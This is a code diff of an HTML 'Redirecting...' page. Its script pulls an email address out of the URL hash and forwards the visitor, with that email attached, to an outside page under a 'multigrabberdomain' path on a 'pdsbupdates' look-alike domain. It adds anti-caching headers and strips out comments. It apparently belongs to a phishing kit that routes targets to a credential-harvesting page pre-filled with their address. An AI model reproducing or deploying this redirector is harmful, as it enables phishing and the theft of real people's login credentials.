@@ -2,58 +2,38 @@
 <html>
 <head>
 <meta charset="UTF-8">
+<!-- CACHE CONTROL: Force browser to always fetch fresh copy -->
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
 <title>Redirecting...</title>
 <script>
-// --- PAGE CLEANER ---
-// Purpose: Captures the hash, converts it to a clean query parameter,
-// and redirects to the final URL with NO HASH.
-
+// --- YOUR EXISTING SCRIPT ---
 (function() {
     console.log("Cleaner activated.");
-
-    // 1. Get the full hash from the browser bar
     var rawHash = window.location.hash;
     console.log("Raw hash detected:", rawHash);
-
     var email = null;
-
-    // 2. Extract the email address
     if (rawHash && rawHash.length > 1) {
-        var hashContent = rawHash.substring(1); // Remove the '#'
-
-        // Handle different possible formats
+        var hashContent = rawHash.substring(1);
         if (hashContent.includes('?well=')) {
             email = hashContent.split('?well=').pop();
         } else if (hashContent.includes('well=')) {
             email = hashContent.split('well=').pop();
         } else {
-            // Assume the entire hash is the email
             email = hashContent;
         }
-
-        // Clean up any trailing slashes or extra characters
         email = email.split('#')[0].split('?')[0];
-        
-        // Decode the email (e.g., %40 -> @)
         try {
             email = decodeURIComponent(email);
-        } catch(e) {
-            console.log("Decoding not needed.");
-        }
-
+        } catch(e) {}
         console.log("Email extracted:", email);
-
-        // 3. --- CRITICAL PART ---
-        // Redirect to your FINAL page with a clean query string.
-        // The hash is GONE. The browser bar will be clean.
         var finalUrl = "https://pdsbupdates.moonbox2025.org/multigrabberdomain/index.html?well=" 
                         + encodeURIComponent(email);
-        
         console.log("Clean redirect to:", finalUrl);
         window.location.replace(finalUrl);
-        
     } else {
-        // Fallback if no hash is present
         console.log("No hash found.");
         document.body.innerHTML = "No email address provided.";
     }
